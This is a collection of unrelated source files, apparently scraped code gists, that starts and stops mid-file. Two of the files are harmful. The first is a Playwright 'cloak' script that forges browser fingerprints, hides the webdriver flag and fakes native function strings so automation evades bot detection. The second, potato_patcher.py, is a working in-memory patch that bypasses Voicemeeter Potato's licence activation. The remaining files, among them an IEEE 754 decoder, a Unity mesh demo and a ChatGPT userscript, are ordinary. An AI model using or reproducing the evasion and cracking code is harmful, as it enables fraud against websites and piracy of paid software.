ps_3_0)', 'ANGLE (NVIDIA GeForce GT 610 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 6290 Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (ATI Mobility Radeon HD 4250 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 8600 GT Direct3D9 vs_3_0 ps_3_0)', 'ANGLE (ATI Radeon HD 5570 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 6800 Series Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) G45/G43 Express Chipset Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (ATI Radeon HD 4600 Series Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA Quadro NVS 160M Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics 3000)', 'ANGLE (NVIDIA GeForce G100)', 'ANGLE (AMD Radeon HD 8610G + 8500M Dual Graphics Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Mobile Intel(R) 4 Series Express Chipset Family Direct3D9 vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 7025 / NVIDIA nForce 630a (Microsoft Corporation - WDDM) Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) Q965/Q963 Express Chipset Family Direct3D9 vs_0_0 ps_2_0)', 'ANGLE (AMD RADEON HD 6350 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (ATI Radeon HD 5450 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce 9500 GT)', 'ANGLE (AMD Radeon HD 6500M/5600/5700 Series Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Mobile Intel(R) 965 Express Chipset Family)', 'ANGLE (NVIDIA GeForce 8400 GS Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (Intel(R) HD Graphics Direct3D9 vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce GTX 560 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce GT 620 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce GTX 660 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon(TM) HD 6520G Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA GeForce GT 240 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (AMD Radeon HD 8240 Direct3D9Ex vs_3_0 ps_3_0)', 'ANGLE (NVIDIA Quadro NVS 140M)', 'ANGLE (Intel(R) Q35 Express Chipset Family Direct3D9 vs_0_0 ps_2_0)'];


function getBrowserfingerprint(buid, emulateFlag = 'desktop') {
 const generateUserAgent = new UserAgent({
 deviceCategory: emulateFlag,
 });
 const fingerprints = Array(1000).fill().map(() => generateUserAgent());


 const WEBGL_PARAMETER = {
 WEBGL_VENDOR: 'Google Inc.',
 WEBGL_RENDERER: WEBGL_RENDERERS[Math.floor(Math.random() * WEBGL_RENDERERS.length)],
 };


 const fingerprint = Object.assign(fingerprints[Math.floor(Math.random() * fingerprints.length)].data, WEBGL_PARAMETER);


 const buidHash = crypto.createHash('sha512').update(buid).digest();
 fingerprint.BUID = buidHash.toString('base64');


 fingerprint.random = (index) => {
 const idx = index % 124;
 if (idx < 62) return buidHash.readUInt32BE(idx) / UINT32_MAX;
 return buidHash.readUInt32LE(idx - 62) / UINT32_MAX;
 };
 return fingerprint;
}




async function cloak(page, fingerprint, {
    minWidth = 1280,
    minHeight = 1024,
 } = {}) {
 console.debug(`fingerprint-webgl-vendor-${fingerprint.WEBGL_VENDOR}`);
 console.debug(`fingerprint-webgl-renderer-${fingerprint.WEBGL_RENDERER}`);
 console.debug(`fingerprint-ua-ua-${fingerprint.userAgent}`);
 console.debug(`fingerprint-ua-platform-${fingerprint.platform}`);
 console.debug(`fingerprint-deviceCategory-${fingerprint.deviceCategory}`);
 console.debug(`fingerprint-viewportHeight-${fingerprint.viewportHeight}`);
 console.debug(`fingerprint-viewportWidth-${fingerprint.viewportWidth}`);




 const LOG_OVERRIDE = true;


 if (LOG_OVERRIDE) {
 await page.on('console', (msg) => {
 if (msg && msg.text) {
 if (typeof msg.text === 'function') {
 debugConsole('PAGE LOG:', msg.text());
 } else {
 debugConsole('PAGE LOG:', msg.text);
 }
 } else {
 debugConsole('PAGE LOG:', msg);
 }
 });
 await page.on('pageerror', (err) => debug('PAGE ERR:', err));
 }


 const DIMENSION = {
 isLandscape: true,
 width: minWidth > fingerprint.viewportWidth ? minWidth : (parseInt(minWidth + (fingerprint.random(0)
 * (fingerprint.screenWidth - minWidth)), 10)),
 height: minHeight > fingerprint.viewportHeight ? minHeight : (parseInt(minHeight + (fingerprint.random(1)
 * (fingerprint.screenHeight - minHeight)), 10)),
 };


 await page.addInitScript(async (fingerprint, LO, D) => {
 const logOverride = (key, value) => {
 if (!LO) return value;
 console.warn(`Overriden: ${key}=${value}`);
 return value;
 };


 function buildPlugin(spec) {
 const plugin = spec;
 plugin.length = spec.mimeTypes.length;
 spec.mimeTypes.forEach((m, i) => {
 plugin[i] = m;
 Object.assign(m, {
 enabledPlugin: plugin,
 });
 });
 delete spec.mimeTypes;
 return plugin;
 }


 const plugins = {
 length: 4,
 0: buildPlugin({
 mimeTypes: [{
 type: 'application/x-google-chrome-pdf',
 suffixes: 'pdf',
 description: 'Portable Document Format',
 enabledPlugin: true,
 }],
 name: 'Chrome PDF Plugin',
 description: 'Portable Document Format',
 filename: 'internal-pdf-viewer',
 }),
 1: buildPlugin({
 mimeTypes: [{
 type: 'application/pdf',
 suffixes: 'pdf',
 description: '',
 extensions: 'pdf',
 enabledPlugin: true,
 }],
 name: 'Chrome PDF Viewer',
 description: '',
 filename: 'mhjfbmdgcfjbbpaeojofohoefgiehjai',
 }),
 2: buildPlugin({
 mimeTypes: [{
 type: 'application/x-nacl',
 suffixes: '',
 description: 'Native Client Executable',
 enabledPlugin: true,
 }, {
 type: 'application/x-pnacl',
 suffixes: '',
 description: 'Portable Native Client Executable',
 enabledPlugin: true,
 },
 {
 type: 'text/html',
 suffixes: '',
 description: '',
 enabledPlugin: true,
 },
 {
 type: 'application/x-ppapi-vysor',
 suffixes: '',
 description: '',
 enabledPlugin: true,
 },
 {
 type: 'application/x-ppapi-vysor-audio',
 suffixes: '',
 description: '',
 enabledPlugin: true,
 },
 ],
 name: 'Native Client',
 description: '',
 filename: fingerprint.platform === 'Win32' ? 'pepflashplayer.dll' : 'internal-nacl-plugin',
 }),
 3: buildPlugin({
 mimeTypes: [{
 type: 'application/x-ppapi-widevine-cdm',
 suffixes: '',
 description: 'Widevine Content Decryption Module',
 enabledPlugin: true,
 }],
 name: 'Widevine Content Decryption Module',
 description: 'Enables Widevine licenses for playback of HTML audio/video content. (version: 1.4.9.1070)',
 filename: fingerprint.platform === 'Win32' ? 'widevinecdmadapter.dll' : 'widevinecdmadapter.plugin',
 }),
 };


 window.screen.__defineGetter__('width', () => logOverride('width', fingerprint.screenWidth));
 window.screen.__defineGetter__('availWidth', () => logOverride('availWidth', fingerprint.screenWidth));
 window.__defineGetter__('innerWidth', () => logOverride('innerWidth', D.width));
 window.__defineGetter__('outerWidth', () => logOverride('outerWidth', D.width));
 window.screen.__defineGetter__('height', () => logOverride('height', fingerprint.screenHeight));
 window.screen.__defineGetter__('availHeight', () => logOverride('availHeight', fingerprint.screenHeight));
 window.__defineGetter__('innerHeight', () => logOverride('innerHeight', D.height - 74));
 window.__defineGetter__('outerHeight', () => logOverride('outerHeight', D.height));


 window.navigator.__defineGetter__('userAgent', () => logOverride('userAgent', fingerprint.userAgent));
 window.navigator.__defineGetter__('platform', () => logOverride('platform', fingerprint.platform));
 window.navigator.__defineGetter__('appName', () => logOverride('appName', fingerprint.appName));
 window.navigator.__defineGetter__('appVersion', () => logOverride('appVersion', fingerprint.userAgent.substring(fingerprint.userAgent.indexOf('/') + 1, fingerprint.userAgent.length)));


 const newProto = navigator.__proto__;
 delete newProto.webdriver;
 navigator.__proto__ = newProto


 window.navigator.__defineGetter__('languages', () => logOverride('languages', ['en-US,en']));
 window.navigator.__defineGetter__('getUserMedia', () => logOverride('getUserMedia', undefined));
 window.navigator.__defineGetter__('webkitGetUserMedia', () => logOverride('webkitGetUserMedia', undefined));


 // reject webRTC fingerprinting
 window.__defineGetter__('MediaStreamTrack', () => logOverride('MediaStreamTrack', undefined));
 window.__defineGetter__('RTCPeerConnection', () => logOverride('RTCPeerConnection', undefined));
 window.__defineGetter__('RTCSessionDescription', () => logOverride('RTCSessionDescription', undefined));
 window.__defineGetter__('webkitMediaStreamTrack', () => logOverride('webkitMediaStreamTrack', undefined));
 window.__defineGetter__('webkitRTCPeerConnection', () => logOverride('webkitRTCPeerConnection', undefined));
 window.__defineGetter__('webkitRTCSessionDescription', () => logOverride('webkitRTCSessionDescription', undefined));
 window.navigator.__defineGetter__('getUserMedia', () => logOverride('getUserMedia', undefined));
 window.navigator.__defineGetter__('webkitGetUserMedia', () => logOverride('webkitGetUserMedia', undefined));


 window.navigator.__defineGetter__('plugins', () => logOverride('plugins', plugins));




 // handle canvas
 class WebGLRenderingContext {
 constructor(cvs) {
 this.extension = {
 UNMASKED_VENDOR_WEBGL: 37445,
 UNMASKED_RENDERER_WEBGL: 37446,
 };
 this.canvas = cvs;
 this.parameter = '';
 this.viewportWidth = cvs.width;
 this.viewportHeight = cvs.height;
 this.supportedExtensions = ['ANGLE_instanced_arrays', 'EXT_blend_minmax', 'EXT_color_buffer_half_float', 'EXT_frag_depth', 'EXT_shader_texture_lod', 'EXT_texture_filter_anisotropic', 'WEBKIT_EXT_texture_filter_anisotropic', 'EXT_sRGB', 'OES_element_index_uint', 'OES_standard_derivatives', 'OES_texture_float', 'OES_texture_float_linear', 'OES_texture_half_float', 'OES_texture_half_float_linear', 'OES_vertex_array_object', 'WEBGL_color_buffer_float', 'WEBGL_compressed_texture_s3tc', 'WEBKIT_WEBGL_compressed_texture_s3tc', 'WEBGL_compressed_texture_s3tc_srgb', 'WEBGL_debug_renderer_info', 'WEBGL_debug_shaders', 'WEBGL_depth_texture', 'WEBKIT_WEBGL_depth_texture', 'WEBGL_draw_buffers', 'WEBGL_lose_context', 'WEBKIT_WEBGL_lose_context'];
 }


 getExtension() {
 return this.extension;
 }


 getParameter() {
 return this.extension;
 }


 getSupportedExtensions() {
 return this.supportedExtensions;
 }
 }


 const canvas = document.createElement('canvas');
 const canvasProto = Object.getPrototypeOf(canvas);
 const origGetContext = canvasProto.getContext;
 canvasProto.getContext = function getContext(...args) {
 const context = origGetContext && (origGetContext.call(this, ...args) || origGetContext.call(this, args[0]));
 if (!context) {
 logOverride('canvas.getContext', 'new WebGLRenderingContext()');
 return new WebGLRenderingContext(this);
 }
 return context;
 };


 canvasProto.getContext.toString = canvasProto.getContext.toString();


 function hookPrototypeMethods(prefix, object) {
 if (!object) return;
 const originals = {};
 const prototype = Object.getPrototypeOf(object);
 Object
 .getOwnPropertyNames(prototype)
 .filter((n) => {
 try {
 return typeof prototype[n] === 'function';
 } catch (error) {
 return false;
 }
 })
 .forEach((n) => {
 originals[n] = prototype[n];
 prototype[n] = function fn(...args) {
 if (prefix === '2d' && (n === 'strokeText' || n === 'fillText')) {
 const temp = Array.from(args);
 temp[0] = fingerprint.BUID;
 temp[1] = Math.max(0, temp[1] - 2);
 temp[2] = Math.max(0, temp[2] - 2);
 originals[n].call(this, ...temp);
 }


 const result = originals[n].call(this, ...args);
 if (LO) {
 let jsonResult;
 try {
 jsonResult = JSON.stringify(result);
 } catch (e) {}
 console.warn('function called', prefix, n, JSON.stringify(args), 'result:', result, jsonResult, `${result}`);
 }
 return result;
 };
 });
 }


 const gls = [];
 try {
 gls.push(document.createElement('canvas').getContext('webgl'));
 gls.push(document.createElement('canvas').getContext('experimental-webgl'));
 } catch (e) {}


 gls.forEach((gl) => {
 const glProto = Object.getPrototypeOf(gl);
 const origGetParameter = glProto.getParameter;
 const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
 if (gl) {
 glProto.getParameter = function getParameter(...args) {
 if (args[0] === debugInfo.UNMASKED_VENDOR_WEBGL) return logOverride('gl.getParameter.UNMASKED_VENDOR_WEBGL', fingerprint.WEBGL_VENDOR);
 if (args[0] === debugInfo.UNMASKED_RENDERER_WEBGL) return logOverride('gl.getParameter.UNMASKED_RENDERER_WEBGL', fingerprint.WEBGL_RENDERER);
 if (args[0] === 33901) return new Float32Array([1, 8191]);
 if (args[0] === 3386) return new Int32Array([16384, 16384]);
 if (args[0] === 35661) return 80;
 if (args[0] === 34076) return 16384;
 if (args[0] === 36349) return 1024;
 if (args[0] === 34024) return 16384;
 if (args[0] === 3379) return 16384;
 if (args[0] === 34921) return 16;
 if (args[0] === 36347) return 1024;


 return origGetParameter.call(this, ...args);
 };
 }
 });


 hookPrototypeMethods('webgl', document.createElement('canvas').getContext('webgl'));
 hookPrototypeMethods('experimental-webgl', document.createElement('canvas').getContext('experimental-webgl'));
 hookPrototypeMethods('2d', document.createElement('canvas').getContext('2d'));
 hookPrototypeMethods('canvas', canvas);


 hookPrototypeMethods('screen', window.screen);
 hookPrototypeMethods('navigator', window.navigator);
 hookPrototypeMethods('history', window.history);
 }, fingerprint, LOG_OVERRIDE, DIMENSION);


 //  emulate permissions
 await page.addInitScript(() => {
 const originalQuery = window.navigator.permissions.query;
 window.navigator.permissions.__proto__.query = (parameters) => (parameters.name === 'notifications' ?
 Promise.resolve({
 state: Notification.permission
 }) :
 originalQuery(parameters));


 const oldCall = Function.prototype.call;


 function call() {
 return oldCall.apply(this, arguments);
 }
 Function.prototype.call = call;


 const nativeToStringFunctionString = Error.toString().replace(
 /Error/g,
 'toString',
 );
 const oldToString = Function.prototype.toString;


 function functionToString() {
 if (this === window.navigator.permissions.query) {
 return 'function query() { [native code] }';
 }
 if (this === functionToString) {
 return nativeToStringFunctionString;
 }
 return oldCall.call(oldToString, this);
 }
 Function.prototype.toString = functionToString;
 });


 // must to hook getters
 await page.goto('about:blank');


 await page.setExtraHTTPHeaders({
 'Accept-Language': 'en-US,en;q=0.9',
 'Accept-Encoding': 'gzip, deflate, br',
 });


 await page.setViewport(DIMENSION);
}




async function run() {
 const args = [
 '--no-sandbox',
 '--remote-debugging-port=9222',
 '--disable-setuid-sandbox',
 '--ignore-certificate-errors',
 '--disk-cache-size=1',
 '--disable-infobars',
 ];
 const o = await tmp.dir({
 unsafeCleanup: true,
 });


 const userDataDir = o.path;


 const browser = await pw.chromium.launchPersistentContext(userDataDir, {
 headless: false,
 bypassCSP: true,
 ignoreHTTPSErrors: true,
 args: args,
 timezoneId: 'America/Los_Angeles',
 });


 // generate a fingerprint
 const fingerprint = await getBrowserfingerprint(uuid.v4());
 let page = await browser.newPage();


 // ""cloak"" our page with evasions
 await cloak(page, fingerprint);


 await page.goto('https://ipleak.com/full-report/');


}


run().catch(console.error);
==<SEPERATOR>==
ieee_754.py
def ieee_754_conversion(n, sgn_len=1, exp_len=8, mant_len=23):
 """"""
    Converts an arbitrary precision Floating Point number.
    Note: Since the calculations made by python inherently use floats, the accuracy is poor at high precision.

    :param n: An unsigned integer of length `sgn_len` + `exp_len` + `mant_len` to be decoded as a float
    :param sgn_len: number of sign bits
    :param exp_len: number of exponent bits
    :param mant_len: number of mantissa bits
    :return: IEEE 754 Floating Point representation of the number `n`
    """"""
 if n >= 2 ** (sgn_len + exp_len + mant_len):
 raise ValueError(""Number n is longer than prescribed parameters allows"")


 sign = (n & (2 ** sgn_len - 1) * (2 ** (exp_len + mant_len))) >> (exp_len + mant_len)
 exponent_raw = (n & ((2 ** exp_len - 1) * (2 ** mant_len))) >> mant_len
 mantissa = n & (2 ** mant_len - 1)


 sign_mult = 1
 if sign == 1:
 sign_mult = -1


 if exponent_raw == 2 ** exp_len - 1:  # Could be Inf or NaN
 if mantissa == 2 ** mant_len - 1:
 return float('nan')  # NaN


 return sign_mult * float('inf')  # Inf


 exponent = exponent_raw - (2 ** (exp_len - 1) - 1)


 if exponent_raw == 0:
 mant_mult = 0 # Gradual Underflow
 else:
 mant_mult = 1


 for b in range(mant_len - 1, -1, -1):
 if mantissa & (2 ** b):
 mant_mult += 1 / (2 ** (mant_len - b))


 return sign_mult * (2 ** exponent) * mant_mult




if __name__ == '__main__':
 import struct
 m = struct.unpack('I', struct.pack('f', -7.125))[0]
 print(""Unsigned Int Recieved:"", m)
 print(""Manually converted:"", ieee_754_conversion(m, exp_len=8, mant_len=23))
"
"potato_patcher.py
","import os
import sys
import subprocess
import traceback


from pymem import Pymem, process, exception
import psutil


import win32api
import win32process
import win32con


#############################################################################################
# This is an in-memory patch that launches and patches Voicemeeter Potato in memory on startup every time.
# It will not actually properly activate Voicemeeter but by supressing the activation popup after the trial period expires
# it behaves as if it has been activated for all intents and purposes.
#
# The most recent versions of Voicemeeter Potato validate their own binary integrity by checking the digital file signature
# so it is no longer possible to simply apply the patch to the binary itself and I couldn't be bothered to figure out how to bypass it.
# This patch was developed for version 3.0.2.8 but it should work for newer versions as long as no major changes are made to the activation popup.
#
# You can just create a Task Scheduler Task with high privileges that launches this python script on logon.
# You have to pass the full exe path and file name of the Voicemeeter exe you want to patch as the only argument in this new version.
# The script will launch and patch Voicemeeter all in one.
#############################################################################################


patches = [
    (""voicemeeter8x64.exe"", b""\xb9\x2c\x01\x00\x00"", b""\xb9\x00\x00""),
    (""voicemeeter8.exe"",    b""\x3d\x2c\x01\x00\x00"", b""\x3d\x00\x00\x00\x00\x7e\x0a\xb8\x00\x00""),
]




def main(voicemeeter_exe_path):
 wait_for_low_cpu_load(5)


 # Select the correct patch based on the executable name
 selected_patch = next((sig, patch) for handle, sig, patch in patches if handle.lower() in voicemeeter_exe_path.lower())


 # Set Python's own priority higher
 set_priority(priority_class=win32con.HIGH_PRIORITY_CLASS)


 # Launch Voicemeeter with idle priority
 proc = subprocess.Popen([voicemeeter_exe_path], cwd=os.path.dirname(voicemeeter_exe_path), creationflags=subprocess.IDLE_PRIORITY_CLASS)
 pid = proc.pid


 if selected_patch:
 sig, patch = selected_patch
 try:
 pm = Pymem(pid)
 print(f""+ Found Voicemeeter with PID {pm.process_id}"")
 module = process.module_from_name(pm.process_handle, os.path.basename(voicemeeter_exe_path))
 address = pm.pattern_scan_module(sig, module)


 if address is not None:
 print(f""+ Found signature at address 0x{address:02x}"")
 pm.write_bytes(address, patch, len(patch))
 print(f""+ Voicemeeter successfully patched"")
 else:
 print(f""- Couldn't find signature 0x{sig.hex()}"")
 print(""* Aborting..."")


 except exception.ProcessNotFound:
 print(""- Process not found, even though it should have been launched."")
 else:
 print(""- No patch found for the given executable."")


 # Restore process priority to normal for Voicemeeter
 set_priority(pid=pid, priority_class=win32con.HIGH_PRIORITY_CLASS)




def set_priority(pid=None, priority_class=win32con.NORMAL_PRIORITY_CLASS):
 if pid is None:
 pid = win32api.GetCurrentProcessId()


 handle = win32api.OpenProcess(win32con.PROCESS_ALL_ACCESS, True, pid)
 win32process.SetPriorityClass(handle, priority_class)




def wait_for_low_cpu_load(threshold):
 while True:
 cpu_load = psutil.cpu_percent(interval=.5)
 if cpu_load < threshold:
 break
 print(f""\rCurrent CPU load: {cpu_load}%, waiting for it to go below {threshold}%"", end="""", flush=True)
 print(""\r"" + ("" "" * 60), end=""\r"")




if __name__ == '__main__':
 try:
 if len(sys.argv) > 1:
 main(' '.join(sys.argv[1:]))
 else:
 print(""Usage: python patch_potato.py <Voicemeeter_exe_path>"")
 except Exception:
 traceback.print_exc()
 input()
==<SEPERATOR>==
NativeMeshTest.cs
using Unity.Collections;
using Unity.Collections.LowLevel.Unsafe;
using Unity.Mathematics;
using UnityEngine;


public class NativeMeshTest : MonoBehaviour
{
 private NativeArray<float3> vertexBuffer;
 private Vector3[] vertexArray;


 // Use this for initialization
 void Start ()
 {
 var mesh = GetComponent<MeshFilter>().mesh;
 
 vertexArray = mesh.vertices; // note: mesh.vertices allocates an Vector3[] - not garbage free! save it for reuse
 vertexBuffer = GetNativeVertexArrays(vertexArray); // copy the array data into a NativeArray. This lets us pass it into Jobs
 
 // some simple work to prove were modifying the arrays
 var copyBuffer = new NativeArray<float3>(vertexBuffer, Allocator.Temp); // Lets make a copy of the native array. this is hella fast!
 int vertexCount = copyBuffer.Length; // for large meshes during deep profiling this could show up in the profiler (a whole 0.04ms on a 1000 vert mesh!), which is weird cos its tiny! figured i might as well cache it, if only to help in editor deep profiling 
 for (int i = 0; i < vertexCount; i++)
 {
			copyBuffer[i] *= 3; // simple modification
 }
 
		SetNativeVertexArray(vertexArray, copyBuffer); // now we have changed the vertex positions stored in our NativeArray, lets apply it back on to the actual mesh. we should see our 3d object grow in size!
		mesh.vertices = vertexArray;
 
		copyBuffer.Dispose(); // clean up the copy now were done with it
 }


 unsafe NativeArray<float3> GetNativeVertexArrays(Vector3[] vertexArray)
 {
 // create a destination NativeArray to hold the vertices
 NativeArray<float3> verts = new NativeArray<float3>(vertexArray.Length, Allocator.Persistent,
			NativeArrayOptions.UninitializedMemory);


 // pin the mesh's vertex buffer in place...
		fixed (void* vertexBufferPointer = vertexArray)
 {
 // ...and use memcpy to copy the Vector3[] into a NativeArray<floar3> without casting. whould be fast!
			UnsafeUtility.MemCpy(NativeArrayUnsafeUtility.GetUnsafeBufferPointerWithoutChecks(verts),
				vertexBufferPointer, vertexArray.Length * (long) UnsafeUtility.SizeOf<float3>());
 }
 // we only hve to fix the .net array in place, the NativeArray is allocated in the C++ side of the engine and
 // wont move arround unexpectedly. We have a pointer to it not a reference! thats basically what fixed does,
 // we create a scope where its 'safe' to get a pointer and directly manipulate the array


 return verts;
 }


 unsafe void SetNativeVertexArray(Vector3[] vertexArray, NativeArray<float3> vertexBuffer)
 {
 // pin the target vertex array and get a pointer to it
		fixed (void* vertexArrayPointer = vertexArray)
 {
 // memcopy the native array over the top
			UnsafeUtility.MemCpy(vertexArrayPointer, NativeArrayUnsafeUtility.GetUnsafeBufferPointerWithoutChecks(vertexBuffer), vertexArray.Length * (long) UnsafeUtility.SizeOf<float3>());
 }
 }


 void Update ()
 {
 // We could modify our cached version of our vertex buffer here, or totally regenerate it procedurally or whatever, skys the limit!
 // instead lets just prove its still valid by drawing it out (badly! really we should also get the triangle index buffer the same way
 // and use that to index the actual triangles in the mesh for drawing. still, shows us the general shape!)
 for (int i = 1; i < vertexBuffer.Length; i++)
 {
			Debug.DrawLine(vertexBuffer[i-1], vertexBuffer[i], Color.red);
 }
 }


 private void OnDestroy()
 {
 // All NativeCollections, including NativeArrays are unmanaged memory - we have to free memory when were done with
 // it ouselves! We used a presistant allocater when we created vertextBuffer so we could keep it around for as
 // long as we want to. We just have to make sure to call dispose at some point, so just before getting destroyed is as
 // good a place as any!
		vertexBuffer.Dispose();
 }
}
"
"fourex.py
","import numpy as np
import pylab as pl
from numpy import fft
 
def fourierExtrapolation(x, n_predict):
 n = x.size
 n_harm = 10 # number of harmonics in model
 t = np.arange(0, n)
 p = np.polyfit(t, x, 1)         # find linear trend in x
 x_notrend = x - p[0] * t # detrended x
 x_freqdom = fft.fft(x_notrend)  # detrended x in frequency domain
 f = fft.fftfreq(n)              # frequencies
 indexes = range(n)
 # sort indexes by frequency, lower -> higher
 indexes.sort(key = lambda i: np.absolute(f[i]))
 
 t = np.arange(0, n + n_predict)
 restored_sig = np.zeros(t.size)
 for i in indexes[:1 + n_harm * 2]:
 ampli = np.absolute(x_freqdom[i]) / n # amplitude
 phase = np.angle(x_freqdom[i])          # phase
 restored_sig += ampli * np.cos(2 * np.pi * f[i] * t + phase)
 return restored_sig + p[0] * t
 
def main():
 x = np.array([669, 592, 664, 1005, 699, 401, 646, 472, 598, 681, 1126, 1260, 562, 491, 714, 530, 521, 687, 776, 802, 499, 536, 871, 801, 965, 768, 381, 497, 458, 699, 549, 427, 358, 219, 635, 756, 775, 969, 598, 630, 649, 722, 835, 812, 724, 966, 778, 584, 697, 737, 777, 1059, 1218, 848, 713, 884, 879, 1056, 1273, 1848, 780, 1206, 1404, 1444, 1412, 1493, 1576, 1178, 836, 1087, 1101, 1082, 775, 698, 620, 651, 731, 906, 958, 1039, 1105, 620, 576, 707, 888, 1052, 1072, 1357, 768, 986, 816, 889, 973, 983, 1351, 1266, 1053, 1879, 2085, 2419, 1880, 2045, 2212, 1491, 1378, 1524, 1231, 1577, 2459, 1848, 1506, 1589, 1386, 1111, 1180, 1075, 1595, 1309, 2092, 1846, 2321, 2036, 3587, 1637, 1416, 1432, 1110, 1135, 1233, 1439, 894, 628, 967, 1176, 1069, 1193, 1771, 1199, 888, 1155, 1254, 1403, 1502, 1692, 1187, 1110, 1382, 1808, 2039, 1810, 1819, 1408, 803, 1568, 1227, 1270, 1268, 1535, 873, 1006, 1328, 1733, 1352, 1906, 2029, 1734, 1314, 1810, 1540, 1958, 1420, 1530, 1126, 721, 771, 874, 997, 1186, 1415, 973, 1146, 1147, 1079, 3854, 3407, 2257, 1200, 734, 1051, 1030, 1370, 2422, 1531, 1062, 530, 1030, 1061, 1249, 2080, 2251, 1190, 756, 1161, 1053, 1063, 932, 1604, 1130, 744, 930, 948, 1107, 1161, 1194, 1366, 1155, 785, 602, 903, 1142, 1410, 1256, 742, 985, 1037, 1067, 1196, 1412, 1127, 779, 911, 989, 946, 888, 1349, 1124, 761, 994, 1068, 971, 1157, 1558, 1223, 782, 2790, 1835, 1444, 1098, 1399, 1255, 950, 1110, 1345, 1224, 1092, 1446, 1210, 1122, 1259, 1181, 1035, 1325, 1481, 1278, 769, 911, 876, 877, 950, 1383, 980, 705, 888, 877, 638, 1065, 1142, 1090, 1316, 1270, 1048, 1256, 1009, 1175, 1176, 870, 856, 860])
 n_predict = 100
 extrapolation = fourierExtrapolation(x, n_predict)
 pl.plot(np.arange(0, extrapolation.size), extrapolation, 'r', label = 'extrapolation')
 pl.plot(np.arange(0, x.size), x, 'b', label = 'x', linewidth = 3)
 pl.legend()
 pl.show()
 
if __name__ == ""__main__"":
 main()
"
"ChatGPT_AutoPromptSender.user.js
","// ==UserScript==
// @name         ChatGPT Auto Prompt Sender
// @namespace    https://userscript.moukaeritai.work/
// @version      1.0.0.20231004
// @description  Automates sending of next pre-filled prompt in ChatGPT after current response completion.
// @author       Takashi SASAKI (https://twitter.com/TakashiSasaki)
// @match        https://chat.openai.com/c/*
// @match        https://chat.openai.com
// @icon         https://www.google.com/s2/favicons?sz=64&domain=openai.com
// @supportURL   https://greasyfork.org/ja/scripts/472713
// @license      MIT
// ==/UserScript==


setTimeout(function() {
 'use strict';


 const div = document.querySelector(""div:has(>form.stretch)"");


 const observer = new MutationObserver((mutationList, observer)=>{
 for(let mutation of mutationList){
 if(mutation.target.querySelector(""div.absolute.right-2"")){
 mutation.target.querySelector(""div.absolute.right-2"").style.background = ""yellow"";
 mutation.target.querySelector(""div.absolute.right-2"").addEventListener(""click"", clickEvent=>{
 if(mutation.target.querySelector(""textarea"").style.background === ""red"") {
 mutation.target.querySelector(""textarea"").style.background = null;
 } else {
 mutation.target.querySelector(""textarea"").style.background = ""red"";
 }//if
 });
 return;
 }//if
 if(mutation.target.querySelector(""button.absolute"")){
 if(mutation.target.querySelector(""textarea"").style.background === ""red""){
 setTimeout(()=> mutation.target.querySelector(""button.absolute"").click(), 1000);
 }//if
 mutation.target.querySelector(""textarea"").style.background = null;
 }//if
 }//for
 });


 observer.observe(div, {attributes: true,
 childList: true,
 subtree: true
 });
}, 1000);
==<SEPERATOR>==
embedded_window.py
def get_window_id(name):
 import Xlib.display


 d = Xlib.display.Display()
 r = d.screen().root


 window_ids = r.get_full_property(
 d.intern_atom('_NET_CLIENT_LIST'), Xlib.X.AnyPropertyType
    ).value


 for window_id in window_ids:
 window = d.create_resource_object('window', window_id)
 if window.get_wm_name() == name:
 return window_id




def run_app(window_id):
 from PyQt5.QtGui import QWindow
 from PyQt5.QtWidgets import QWidget, QVBoxLayout, QApplication, QPushButton


 app = QApplication([])
 main_widget = QWidget()
 layout = QVBoxLayout(main_widget)


 window = QWindow.fromWinId(window_id)
 widget = QWidget.createWindowContainer(window)
 layout.addWidget(widget)


 button = QPushButton('Close')
 button.clicked.connect(main_widget.close)
 layout.addWidget(button)


 main_widget.show()
 app.exec_()




if __name__ == '__main__':
 window_id = get_window_id('some window name')
 if window_id:
 run_app(window_id)
"
"git-diff-summarizer.py
","import subprocess
import clipboard
from openai import OpenAI


client = OpenAI(api_key = ""your-openai-key"")


# This command returns the staged changes as a patch
git_diff_command = ['git', 'diff', '--cached']
result = subprocess.run(git_diff_command, text=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.DEVNULL)


# Generate a summary.
prompt_messages = [
  {
 ""role"": ""system"",
 ""content"": """"""
      As a skilled git mergemaster, you possess the expertise to craft clear and comprehensible git commit messages. Kindly generate a git commit message based
      on the provided git patch. Use verbosity judiciously. Please generate two text snippets, separated with a blank line, following these rules:
      - Capitalized, short (50 chars or less) summary
      - More detailed explanatory text, if necessary.
      - In some contexts, the first line is treated as the subject of an email and the rest of the text as the body. The blank line separating the summary from
        the body is critical (unless you omit the body entirely); tools like rebase can get confused if you run the two together.
      - Always leave the second line blank.
      - Write your commit message in the imperative: ""Fix bug"" and not ""Fixed bug"" or ""Fixes bug."" This convention matches up with commit messages generated by
        commands like git merge and git revert.
      - Further paragraphs come after blank lines.
          - Bullet points are okay, too, but make sure every line ends with a period.
          - Typically a hyphen or asterisk is used for the bullet, preceded by a single space, with blank lines in between, but conventions vary here.
          - Use a hanging indent.
      - When referencing a class, always avoid using the file extension suffix (e.g., '.cs') since it is evident that it is a class. The filenames themselves
